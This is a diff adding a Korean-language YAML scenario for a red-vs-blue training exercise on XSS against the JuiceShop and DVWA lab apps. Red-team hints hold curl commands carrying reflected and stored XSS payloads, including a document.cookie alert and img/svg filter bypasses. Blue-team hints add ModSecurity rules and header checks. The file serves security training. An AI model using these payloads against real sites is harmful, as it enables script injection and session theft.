@@ -1,0 +1,116 @@
+id: "xss-vs-filter"
+title: "XSS 공격 vs 입력 필터링"
+description: "고객 포털 사이트에서 사용자 입력값이 제대로 검증되지 않는다는 제보가 접수되었다. Red Team은 다양한 XSS 벡터를 시도하여 스크립트 실행을 증명해야 한다. Blue Team은 WAF 룰과 CSP 헤더를 점검하고 강화하여 XSS 공격을 원천 차단해야 한다."
+difficulty: "easy"
+time_limit: 1800
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "JuiceShop(http://10.20.30.80:3000)의 검색 기능에 Reflected XSS 페이로드를 삽입하라."
+    hint: "curl -s 'http://10.20.30.80:3000/#/search?q=<script>alert(1)</script>'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "script"
+
+  - order: 2
+    instruction: "DVWA(http://10.20.30.80:8080)의 XSS(Reflected) 페이지에서 스크립트 삽입을 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>' -b 'security=low; PHPSESSID=test'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "<script>"
+
+  - order: 3
+    instruction: "DVWA의 XSS(Stored) 페이지에 Stored XSS 페이로드를 저장하라."
+    hint: "curl -s -X POST 'http://10.20.30.80:8080/vulnerabilities/xss_s/' -b 'security=low; PHPSESSID=test' -d 'txtName=hacker&mtxMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Guestbook"
+
+  - order: 4
+    instruction: "img 태그의 onerror 이벤트를 이용한 XSS 우회를 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>' -b 'security=low; PHPSESSID=test'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "onerror"
+
+  - order: 5
+    instruction: "SVG 태그를 이용한 XSS 페이로드로 필터 우회를 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/xss_r/?name=<svg onload=alert(1)>' -b 'security=low; PHPSESSID=test'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "svg"
+
+  - order: 6
+    instruction: "whatweb으로 JuiceShop의 보안 헤더 설정 상태를 확인하라."
+    hint: "whatweb http://10.20.30.80:3000 -v"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "http://10.20.30.80:3000"
+
+blue_missions:
+  - order: 1
+    instruction: "ModSecurity 로그에서 XSS 공격 탐지 이벤트를 확인하라."
+    hint: "grep -i 'xss\\|cross-site' /var/log/apache2/modsec_audit.log | tail -20"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "XSS"
+
+  - order: 2
+    instruction: "현재 적용된 ModSecurity XSS 관련 룰을 확인하라."
+    hint: "grep -r 'xss\\|cross-site' /etc/modsecurity/ | head -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "xss"
+
+  - order: 3
+    instruction: "ModSecurity에 이벤트 핸들러 기반 XSS를 차단하는 커스텀 룰을 추가하라."
+    hint: "echo 'SecRule ARGS \"on(error|load|click|mouseover)\\s*=\" \"id:100002,phase:2,deny,status:403,msg:XSS Event Handler Block\"' >> /etc/modsecurity/custom-rules.conf"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "웹 서버의 응답 헤더에 Content-Security-Policy가 설정되어 있는지 확인하라."
+    hint: "curl -sI http://10.20.30.80:3000 | grep -i 'content-security-policy'"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Content-Security-Policy"
+
+  - order: 5
+    instruction: "Apache 설정에 X-XSS-Protection 헤더를 추가하라."
+    hint: "echo 'Header set X-XSS-Protection \"1; mode=block\"' >> /etc/apache2/conf-enabled/security.conf"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 6
+    instruction: "suricata 로그에서 XSS 패턴 탐지 기록을 확인하라."
+    hint: "grep -i 'xss\\|script' /var/log/suricata/fast.log | tail -10"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "script"
